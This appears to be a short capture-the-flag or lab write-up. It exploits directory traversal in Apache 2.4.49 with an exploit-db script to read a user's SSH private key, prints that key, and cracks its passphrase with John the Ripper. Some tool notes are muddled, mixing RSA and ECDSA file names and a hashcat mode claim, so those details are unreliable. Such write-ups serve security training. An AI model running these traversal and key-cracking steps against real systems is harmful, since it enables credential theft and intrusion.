This server is running a vulnerable version of apache (2.4.49)

This allows directory traversal and the exploit for this is available on exploit-db
>https://www.exploit-db.com/exploits/50383

This vulnerability allowed us to retrieve anita's ssh private key and gain access to the server via port 2222.

### Anita's ssh private key
```
./50383.sh targets.txt /home/anita/.ssh/id_ecdsa                                                                 Thu 28 Sep 2023 12:18:35 AM EDT
./50383.sh: 12: [[: not found
./50383.sh: 12: [[: not found
192.168.203.245
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----
```

 1. First we need to crack the passphrase key used to generate the private key.
 ```
 ssh2john anitas_rsa > anitas_rsa.hash
```
2. Note that hashcat does not support ssh private keys cracking for mode $6\$ - SHA512
3. After running removing the filaname from the hash, we were able to crack the passphrase for the ssh key using johntheripper
```shell
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fireball         (?)     
1g 0:00:03:39 DONE (2023-09-28 18:28) 0.004557g/s 18.66p/s 18.66c/s 18.66C/s fireball..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
> The passphrase found is: **fireball**

![[Pasted image 20230928183235.png]]
